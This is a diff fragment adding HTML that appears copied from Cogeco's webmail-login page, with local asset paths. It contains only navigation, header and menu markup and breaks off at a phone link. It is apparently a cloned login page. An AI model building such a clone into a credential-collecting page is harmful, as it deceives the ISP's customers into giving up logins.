+                          data-track-section-name="support > billing and account"
+                          data-track-link-title="Log in to My Account"
+                          class="block-left-main-menu parent"
+                        >
+                          Log in to My Account
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="/en/discover-my-account"
+                          target="_self"
+                          data-track-section-name="support > billing and account"
+                          data-track-link-title="Discover My Account"
+                          class="block-left-main-menu parent"
+                          data-drupal-link-system-path="node/47801"
+                        >
+                          Discover My Account
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a
+                      href=""
+                      rel="nofollow"
+                      class="section block-left-main-menu parent"
+                    >
+                      FAQ Articles
+                      <span class="arrow-indicator"
+                        ><span class="fa icon-chevron-down"></span
+                      ></span>
+                    </a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href="https://support.cogeco.ca/hc/en-ca"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="support > faq articles"
+                          data-track-link-title="support articles"
+                        >
+                          Support articles
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://support.cogeco.ca/hc/en-ca/articles/360058062494-How-do-I-set-up-Cogeco-Internet-and-Wi-Fi-"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="support > faq articles"
+                          data-track-link-title="setting up internet and wi-fi"
+                        >
+                          Setting up Internet and Wi-Fi
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://support.cogeco.ca/hc/en-ca/articles/360058055854-How-do-I-reset-my-modem-"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="support > faq articles"
+                          data-track-link-title="resetting my modem"
+                        >
+                          Resetting my modem
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://support.cogeco.ca/hc/en-ca/articles/360058055194-How-do-I-change-my-Wi-Fi-Network-Name-and-Password-"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="support > faq articles"
+                          data-track-link-title="changing my wi-fi name and password"
+                        >
+                          Changing my Wi-Fi name and password
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://support.cogeco.ca/hc/en-ca/articles/360058062674-Where-can-I-find-the-codes-to-program-the-remote-control-with-my-other-devices-"
+                          target="_self"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="support > faq articles"
+                          data-track-link-title="programming my remote"
+                        >
+                          Programming my remote
+                        </a>
+                      </li>
+
+                      <li>
+                        <a
+                          href="https://support.cogeco.ca/hc/en-ca/articles/360058066854-Where-do-I-find-the-channels-in-free-previews-this-month-"
+                          class="block-left-main-menu parent"
+                          data-track-section-name="support > faq articles"
+                          data-track-link-title="finding free previews"
+                        >
+                          Finding free previews
+                        </a>
+                      </li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </nav>
+
+          <div class="myAccountLeftMenu-wrapper">
+            <div class="myAccountLeftMenu">
+              <a
+                href="https://myaccount.cogeco.ca/"
+                data-track-link-title="my-account"
+              >
+                <span class="ico-header-myaccount"></span>My Account</a
+              >
+            </div>
+          </div>
+
+          <section class="feedback-section">
+            <div class="section-container">
+              <ul>
+                <li class="webmail">
+                  <a
+                    href="https://www.cogeco.ca/en/webmail-login"
+                    data-track-link-title="webmail"
+                  >
+                    <span class="ico-webmail-black"></span>
+                    Webmail
+                  </a>
+                </li>
+                <li>
+                  <a
+                    href="/en/contact"
+                    class="contact"
+                    data-track-link-title="contact"
+                  >
+                    Contact us
+                  </a>
+                </li>
+              </ul>
+              <div class="language">
+                <a
+                  href="/fr/courriel-web"
+                  data-track-link-title="language-switch"
+                  class="language-switch-link"
+                  aria-label="Selected language: English"
+                  >fr</a
+                >
+              </div>
+              <div class="province">
+                <div data-action="switch-province">
+                  <span
+                    class="label-province"
+                    data-track-link-title="province-switch"
+                    ><span class="ico-mbmenu-geoloc"></span
+                    ><span>Ontario</span></span
+                  >
+                  <ul>
+                    <li>
+                      <span
+                        data-link="/en/switch/province/QC?cb=/en/webmail-login%3Ferror%3Dwm_wrong_password"
+                        data-track-link-title="Québec"
+                        >Québec</span
+                      >
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </section>
+          <!--<ul id="left-menu-shop">
+    </ul>-->
+        </div>
+      </div>
+
+      <!--
+<div id="body-overlay"></div>
+-->
+      <header id="site-header" data-section="residential">
+        <section
+          id="cogeco-notifications"
+          data-track-component-type="notification"
+          data-track-component-name="top bar notification"
+          data-track-component-position="top"
+        ></section>
+
+        <div id="skip">
+          <a href="#outer-container" class="skip-link">Skip to main content</a>
+        </div>
+
+        <div
+          class="region-top-header"
+          data-track-component-type="navigation"
+          data-track-component-name="eyebrow"
+          data-track-component-position="top"
+        >
+          <div class="container">
+            <div class="row">
+              <div class="col-12">
+                <nav
+                  role="navigation"
+                  aria-label="Website EN"
+                  class="main-menu"
+                >
+                  <ul>
+                    <li>
+                      <a
+                        href="/en/home"
+                        data-drupal-link-system-path="node/71346"
+                        class="is-active"
+                        ><span data-track-link-title="residential"
+                          >Residential</span
+                        ></a
+                      >
+                    </li>
+                    <li>
+                      <a
+                        href="/en/business"
+                        target="_self"
+                        data-drupal-link-system-path="node/44116"
+                        ><span data-track-link-title="business"
+                          >Business</span
+                        ></a
+                      >
+                    </li>
+                    <li>
+                      <a href="https://careers.cogeco.ca" title="Cogeco Careers"
+                        ><span data-track-link-title="careers">Careers</span></a
+                      >
+                    </li>
+                  </ul>
+                </nav>
+
+                <ul class="contact-wrapper">
+                  <li>
+                    <a
+                      href="/en/contact"
+                      class="contact"
+                      data-track-link-title="contact"
+                    >
+                      <img src="./assets/images/store-light-38.svg" alt="" />
+                      Contact us
+                    </a>
+                  </li>
+
+                  <li>
+                    <a
+                      href="https://myaccount.cogeco.ca/"
+                      data-track-link-title="my-account"
+                    >
+                      <img src="./assets/images/myaccount-dark-38.svg" alt="" />
+                      Log in
+                    </a>
+                  </li>
+
+                  <li>
+                    <a
+                      href="https://www.cogeco.ca/en/webmail-login"
+                      data-track-link-title="webmail"
+                    >
+                      <img src="./assets/images/Vector.svg" alt="" />
+                      Webmail
+                    </a>
+                  </li>
+
+                  <div class="province">
+                    <div data-action="switch-province">
+                      <span
+                        class="label-province"
+                        data-track-link-title="province-switch"
+                        ><span class="ico-mbmenu-geoloc"></span
+                        ><span>Ontario</span></span
+                      >
+                      <ul>
+                        <li>
+                          <span
+                            data-link="/en/switch/province/QC?cb=/en/webmail-login%3Ferror%3Dwm_wrong_password"
+                            data-track-link-title="Québec"
+                            >Québec</span
+                          >
+                        </li>
+                      </ul>
+                    </div>
+                  </div>
+
+                  <div class="language">
+                    <a
+                      href="/fr/courriel-web"
+                      data-track-link-title="language-switch"
+                      class="language-switch-link"
+                      aria-label="Selected language: English"
+                      >fr</a
+                    >
+                  </div>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div
+          class="block_geolocalisation_popup"
+          aria-hidden="true"
+          data-track-component-type="navigation"
+          data-track-component-name="geoloc"
+          data-track-component-position="top"
+        >
+          <div class="geoloc-container">
+            <div class="icon-location"></div>
+
+            <p class="text">
+              You have been located in <strong>Ontario</strong>.<br
+                class="not-on-mobile"
+              />
+              You can change your province here.
+            </p>
+
+            <button
+              class="button button-midnight-outl-light active-province"
+              tabindex="-1"
+              data-track-link-title="Ontario"
+            >
+              ✓ Ontario
+            </button>
+
+            <a
+              href="/en/switch/province/qc?cb=/en/webmail-login%3Ferror%3Dwm_wrong_password"
+              class="button button-coral-light"
+              tabindex="-1"
+              data-track-link-title="Québec"
+              >Québec</a
+            >
+
+            <button
+              class="close-btn"
+              aria-label="Close"
+              tabindex="-1"
+              data-track-link-title="closed-button"
+            ></button>
+          </div>
+        </div>
+
+        <div
+          id="header-container"
+          class="container"
+          data-track-component-type="navigation"
+          data-track-component-name="main-menu"
+          data-track-component-position="top"
+        >
+          <div class="row">
+            <div class="col-12">
+              <div class="sliding-menu-open">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  xmlns:xlink="http://www.w3.org/1999/xlink"
+                  version="1.1"
+                  width="20"
+                  height="30"
+                >
+                  <rect x="1" y="9" width="18" height="2.5"></rect>
+                  <rect x="1" y="15" width="18" height="2.5"></rect>
+                  <rect x="1" y="21" width="18" height="2.5"></rect>
+                </svg>
+              </div>
+
+              <a
+                href="/en/"
+                class="website-logo"
+                data-track-link-title="website-logo"
+              >
+                <img
+                  src="./assets/images/logo-cogeco-blue.svg"
+                  alt="Cogeco logo"
+                />
+              </a>
+
+              <nav
+                role="navigation"
+                aria-label="Main Menu EN"
+                class="main-menu"
+              >
+                <ul>
+                  <li>
+                    <a href="" class="parent" target="_self">Shop</a>
+
+                    <ul>
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="shop"
+                          data-track-link-title="Internet"
+                          title="section"
+                          >Internet</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="/en/promo/special-offer"
+                              data-track-section-name="shop > internet"
+                              data-track-link-title="promotions"
+                              data-drupal-link-system-path="node/70021"
+                              >Promotions</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/internet/packages"
+                              data-track-section-name="shop > internet"
+                              data-track-link-title="internet packages"
+                              data-drupal-link-system-path="node/69641"
+                              >Internet packages</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/internet"
+                              data-track-section-name="shop > internet"
+                              data-track-link-title="why choose cogeco internet"
+                              data-drupal-link-system-path="node/44131"
+                              >Why choose Cogeco Internet?</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/internet/compare-packages"
+                              target="_self"
+                              data-track-section-name="shop > internet"
+                              data-track-link-title="compare packages"
+                              data-drupal-link-system-path="node/54646"
+                              >Compare packages</a
+                            >
+                          </li>
+
+                          <li>
+                            <span
+                              ><div role="separator" class="divider"></div
+                            ></span>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/internet/wifi"
+                              data-track-section-name="shop > internet"
+                              data-track-link-title="Cogeco Wi-Fi"
+                              data-drupal-link-system-path="node/70746"
+                              >Cogeco Wi-Fi</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/internet/wifi-pods"
+                              target="_self"
+                              data-track-section-name="shop > internet"
+                              data-track-link-title="Cogeco Wi-Fi Pods"
+                              data-drupal-link-system-path="node/60071"
+                              >Cogeco Wi-Fi Pods</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="shop"
+                          data-track-link-title="EPICO TV + Internet"
+                          >EPICO TV + Internet</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="/en/bundles-promotions"
+                              data-track-section-name="shop > epico tv + internet"
+                              data-track-link-title="promotions"
+                              data-drupal-link-system-path="node/69681"
+                              >Promotions</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/epico"
+                              data-track-section-name="shop > epico tv + internet"
+                              data-track-link-title="Discover EPICO"
+                              data-drupal-link-system-path="node/70036"
+                              >Discover EPICO</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/epico/packages"
+                              target="_self"
+                              data-track-section-name="shop > epico tv + internet"
+                              data-track-link-title="EPICO packages and channels"
+                              data-drupal-link-system-path="node/69671"
+                              >EPICO packages and channels</a
+                            >
+                          </li>
+
+                          <li>
+                            <span
+                              ><div role="separator" class="divider"></div
+                            ></span>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/tv/news"
+                              target="_self"
+                              data-track-section-name="shop > epico tv + internet"
+                              data-track-link-title="on demand and free previews"
+                              data-drupal-link-system-path="node/54286"
+                              >On Demand and free previews</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/channels-listing/premium-channels"
+                              target="_self"
+                              data-track-section-name="shop > epico tv + internet"
+                              data-track-link-title="Premium channels"
+                              data-drupal-link-system-path="node/78321"
+                              >Premium channels</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/channels-listing/sports"
+                              data-track-section-name="shop > epico tv + internet"
+                              data-track-link-title="Sports channels"
+                              data-drupal-link-system-path="node/77571"
+                              >Sports channels</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/tv"
+                              data-track-section-name="shop > epico tv + internet"
+                              data-track-link-title="other tv packages"
+                              data-drupal-link-system-path="node/44296"
+                              >Other TV packages</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="shop"
+                          >Phone</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="/en/phone/packages"
+                              data-track-section-name="shop > phone"
+                              data-track-link-title="phone packages"
+                              data-drupal-link-system-path="node/69661"
+                              >Phone packages</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/phone"
+                              data-track-section-name="shop > phone"
+                              data-track-link-title="why choose cogeco phone"
+                              data-drupal-link-system-path="node/44156"
+                              >Why choose Cogeco Phone?</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/phone/long-distance-calling-features"
+                              data-track-section-name="shop > phone"
+                              data-track-link-title="long distance and calling features"
+                              data-drupal-link-system-path="node/53681"
+                              >Long distance and calling features</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="shop"
+                          >Why Cogeco</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="/en/promo/why-choose"
+                              target="_self"
+                              data-track-section-name="shop > why cogeco"
+                              data-track-link-title="our commitment"
+                              data-drupal-link-system-path="node/60146"
+                              >Our commitment</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/networkexpansion"
+                              target="_self"
+                              data-track-section-name="shop > why cogeco"
+                              data-track-link-title="cogeco network expansion"
+                              data-drupal-link-system-path="node/69056"
+                              >Cogeco network expansion</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/boutique/reco/question/1"
+                              data-track-section-name="shop > why cogeco"
+                              data-track-link-title="Find the right package"
+                              >Find the right package</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/promo/moving-offer"
+                              target="_self"
+                              data-track-section-name="shop > why cogeco"
+                              data-track-link-title="Moving"
+                              data-drupal-link-system-path="node/69856"
+                              >Moving?</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a href="" target="_self" rel="nofollow" class="parent"
+                      >Customer zone</a
+                    >
+
+                    <ul>
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          target="_self"
+                          data-track-section-name="customer zone"
+                          >My Internet service</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="/en/internet/wifi-pods"
+                              data-track-section-name="customer zone > my internet service"
+                              data-track-link-title="Cogeco Wi-Fi and pods"
+                              data-drupal-link-system-path="node/60071"
+                              >Cogeco Wi-Fi and pods</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/internet/usage/"
+                              data-track-section-name="customer zone > my internet service"
+                              data-track-link-title="my internet usage"
+                              >My Internet usage
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/internet/usage"
+                              target="_self"
+                              data-track-section-name="customer zone > my internet service"
+                              data-track-link-title="internet usage explained"
+                              data-drupal-link-system-path="node/57946"
+                              >Internet usage explained</a
+                            >
+                          </li>
+
+                          <li>
+                            <span
+                              ><div role="separator" class="divider"></div
+                            ></span>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/internet/security-services"
+                              target="_self"
+                              data-track-section-name="customer zone > my internet service"
+                              data-track-link-title="internet security"
+                              data-drupal-link-system-path="node/48366"
+                              >Internet security</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/faq/how-do-i-measure-my-internet-speeds-cogeco-speed-test-56111"
+                              target="_self"
+                              data-track-section-name="customer zone > my internet service"
+                              data-track-link-title="speed test tool"
+                              data-drupal-link-system-path="node/56111"
+                              >Speed test tool</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://support.cogeco.ca/hc/en-ca/sections/360012112433-Fraud-and-scams"
+                              target="_self"
+                              data-track-section-name="customer zone > my internet service"
+                              data-track-link-title="Prevent fraud and scams"
+                              >Prevent fraud and scams</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="customer zone"
+                          >My TV service</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="https://tvlisting.cogeco.ca/"
+                              target="_self"
+                              data-track-section-name="customer zone > my tv service"
+                              data-track-link-title="tv guide"
+                              >TV guide</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/tv/channels-listing"
+                              target="_self"
+                              data-track-section-name="customer zone > my tv service"
+                              data-track-link-title="channel list"
+                              data-drupal-link-system-path="node/54181"
+                              >Channel list</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/tv/channel_selector/"
+                              data-track-section-name="customer zone > my tv service"
+                              data-track-link-title="modify my tv channels"
+                              >Modify my TV channels
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/tv/news"
+                              target="_self"
+                              data-track-section-name="customer zone > my tv service"
+                              data-track-link-title="what's new on demand"
+                              data-drupal-link-system-path="node/54286"
+                              >What's new On Demand</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/tv/own-your-movies"
+                              data-track-section-name="customer zone > my tv service"
+                              data-track-link-title="own your movies"
+                              data-drupal-link-system-path="node/71371"
+                              >Own your movies</a
+                            >
+                          </li>
+
+                          <li>
+                            <span
+                              ><div role="separator" class="divider"></div
+                            ></span>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/epico/get-started"
+                              data-track-section-name="customer zone > my tv service"
+                              data-track-link-title="get started with epico"
+                              data-drupal-link-system-path="node/68211"
+                              >Get started with EPICO</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/epico/cloud-pvr-and-remote"
+                              target="_self"
+                              data-track-section-name="customer zone > my tv service"
+                              data-track-link-title="epico equipment"
+                              data-drupal-link-system-path="node/68346"
+                              >EPICO equipment</a
+                            >
+                          </li>
+
+                          <li>
+                            <span
+                              ><div role="separator" class="divider"></div
+                            ></span>
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://www.yourtv.tv/community-selection"
+                              target="_blank"
+                              data-track-section-name="customer zone > my tv service"
+                              data-track-link-title="discover yourtv"
+                              >Discover YourTV</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="customer zone"
+                          >My Phone service</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/phone/"
+                              data-track-section-name="customer zone > my phone service"
+                              data-track-link-title="my phone usage"
+                              >My Phone usage
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/phone/long-distance-calling-features"
+                              target="_self"
+                              data-track-section-name="customer zone > my phone service"
+                              data-track-link-title="long distance and calling features"
+                              data-drupal-link-system-path="node/53681"
+                              >Long distance and calling features</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="Customer zone"
+                          >My bill</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/billing"
+                              data-track-section-name="customer zone > my bill"
+                              data-track-link-title="view your bill"
+                              >View my bill
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/support/understanding-my-bill"
+                              target="_self"
+                              data-track-section-name="customer zone > my bill"
+                              data-track-link-title="my bill explained"
+                              data-drupal-link-system-path="node/50981"
+                              >My bill explained</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/billing/pay_bill"
+                              data-track-section-name="customer zone > my bill"
+                              data-track-link-title="make a payment"
+                              >Make a payment
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/profile"
+                              data-track-section-name="customer zone > my bill"
+                              data-track-link-title="change your mailing address"
+                              >Change my mailing address
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/payment_method"
+                              data-track-section-name="customer zone > my bill"
+                              data-track-link-title="change your method of payment"
+                              >Change my method of payment
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/profile"
+                              data-track-section-name="customer zone > my bill"
+                              data-track-link-title="update your user profile"
+                              >Update my user profile
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/ebilling"
+                              data-track-section-name="customer zone > my bill"
+                              data-track-link-title="get paperless billing"
+                              >Get paperless billing
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+                        </ul>
+                      </li>
+
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="customer zone"
+                          >My services</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acpub/register/"
+                              data-track-section-name="customer zone > my services"
+                              data-track-link-title="register for my account"
+                              >Register for My Account
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/tv/change-tv"
+                              target="_self"
+                              data-track-section-name="customer zone > my services"
+                              data-track-link-title="modify my tv services"
+                              >Modify my TV services
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acauth/all/internet/change-internet"
+                              data-track-section-name="customer zone > my services"
+                              data-track-link-title="modify my internet services"
+                              >Modify my Internet services
+                              <img
+                                src="./assets/images/icon_myaccount_small_gray.png"
+                                alt=""
+                                data-track-link-title="icon"
+                            /></a>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/support/outages"
+                              data-track-section-name="customer zone > my services"
+                              data-track-link-title="outages and maintenance"
+                              data-drupal-link-system-path="node/56736"
+                              >Outages and maintenance</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/move-easy"
+                              target="_self"
+                              data-track-section-name="customer zone > my services"
+                              data-track-link-title="Moving soon ?"
+                              data-drupal-link-system-path="node/72631"
+                              >Moving soon?</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+                    </ul>
+                  </li>
+
+                  <li>
+                    <a href="" target="_self" rel="nofollow" class="parent"
+                      >Support</a
+                    >
+
+                    <ul>
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="support"
+                          >Services</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="/en/support"
+                              target="_self"
+                              data-track-section-name="support > services"
+                              data-track-link-title="general support"
+                              data-drupal-link-system-path="node/48671"
+                              >General support</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/support/epico"
+                              data-track-section-name="support > services"
+                              data-track-link-title="epico"
+                              data-drupal-link-system-path="node/66586"
+                              >EPICO</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/support/internet"
+                              target="_self"
+                              data-track-section-name="support > services"
+                              data-track-link-title="internet"
+                              data-drupal-link-system-path="node/51471"
+                              >Internet</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/support/tv"
+                              target="_self"
+                              data-track-section-name="support > services"
+                              data-track-link-title="standard tv"
+                              data-drupal-link-system-path="node/51426"
+                              >Standard TV</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/support/phone"
+                              target="_self"
+                              data-track-section-name="support > services"
+                              data-track-link-title="phone"
+                              data-drupal-link-system-path="node/51346"
+                              >Phone</a
+                            >
+                          </li>
+
+                          <li>
+                            <span
+                              ><div role="separator" class="divider"></div
+                            ></span>
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/internet/security-services"
+                              data-track-section-name="support > services"
+                              data-track-link-title="Cogeco Security"
+                              data-drupal-link-system-path="node/48366"
+                              >Cogeco Security</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/support/self-install"
+                              data-track-section-name="support > services"
+                              data-track-link-title="self-install"
+                              data-drupal-link-system-path="node/66126"
+                              >Self-install</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/support/outages"
+                              target="_self"
+                              data-track-section-name="support > services"
+                              data-track-link-title="outages and maintenance"
+                              data-drupal-link-system-path="node/56736"
+                              >Outages and maintenance</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+
+                      <li>
+                        <a
+                          href=""
+                          class="section"
+                          data-track-section-name="support"
+                          title="section"
+                          >Billing and account</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="/en/support/billing-and-account"
+                              target="_self"
+                              data-track-section-name="support > billing and account"
+                              data-track-link-title="General support"
+                              data-drupal-link-system-path="node/48896"
+                              >General support</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/move-easy"
+                              target="_self"
+                              data-track-section-name="support > billing and account"
+                              data-track-link-title="moving soon"
+                              data-drupal-link-system-path="node/72631"
+                              >Moving soon?</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://support.cogeco.ca/hc/en-ca/sections/360012112433-Fraud-and-scams"
+                              target="_self"
+                              data-track-section-name="support > billing and account"
+                              data-track-link-title="Fraud and scams"
+                              >Fraud and scams</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/support/dery-axion-integration"
+                              target="_self"
+                              data-track-section-name="support > billing and account"
+                              data-track-link-title="DERY and Axion powered by Cogeco"
+                              data-drupal-link-system-path="node/75306"
+                              >DERY and Axion powered by Cogeco</a
+                            >
+                          </li>
+
+                          <li>
+                            <span
+                              ><div role="separator" class="divider"></div
+                            ></span>
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://myaccount.cogeco.ca/acpub/login"
+                              target="_self"
+                              data-track-section-name="support > billing and account"
+                              data-track-link-title="Log in to My Account"
+                              >Log in to My Account</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="/en/discover-my-account"
+                              target="_self"
+                              data-track-section-name="support > billing and account"
+                              data-track-link-title="Discover My Account"
+                              data-drupal-link-system-path="node/47801"
+                              >Discover My Account</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+
+                      <li>
+                        <a href="" rel="nofollow" class="section"
+                          >FAQ Articles</a
+                        >
+
+                        <ul>
+                          <li>
+                            <a
+                              href="https://support.cogeco.ca/hc/en-ca"
+                              target="_self"
+                              data-track-section-name="support > faq articles"
+                              data-track-link-title="support articles"
+                              >Support articles</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://support.cogeco.ca/hc/en-ca/articles/360058062494-How-do-I-set-up-Cogeco-Internet-and-Wi-Fi-"
+                              data-track-section-name="support > faq articles"
+                              data-track-link-title="setting up internet and wi-fi"
+                              >Setting up Internet and Wi-Fi</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://support.cogeco.ca/hc/en-ca/articles/360058055854-How-do-I-reset-my-modem-"
+                              data-track-section-name="support > faq articles"
+                              data-track-link-title="resetting my modem"
+                              >Resetting my modem</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://support.cogeco.ca/hc/en-ca/articles/360058055194-How-do-I-change-my-Wi-Fi-Network-Name-and-Password-"
+                              target="_self"
+                              data-track-section-name="support > faq articles"
+                              data-track-link-title="changing my wi-fi name and password"
+                              >Changing my Wi-Fi name and password</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://support.cogeco.ca/hc/en-ca/articles/360058062674-Where-can-I-find-the-codes-to-program-the-remote-control-with-my-other-devices-"
+                              target="_self"
+                              data-track-section-name="support > faq articles"
+                              data-track-link-title="programming my remote"
+                              >Programming my remote</a
+                            >
+                          </li>
+
+                          <li>
+                            <a
+                              href="https://support.cogeco.ca/hc/en-ca/articles/360058066854-Where-do-I-find-the-channels-in-free-previews-this-month-"
+                              data-track-section-name="support > faq articles"
+                              data-track-link-title="finding free previews"
+                              >Finding free previews</a
+                            >
+                          </li>
+                        </ul>
+                      </li>
+                    </ul>
+                  </li>
+                </ul>
+              </nav>
+
+              <a
+                href="tel:+18662614447"
+                role="link"
+                tabindex="0"
+                id="callUs"
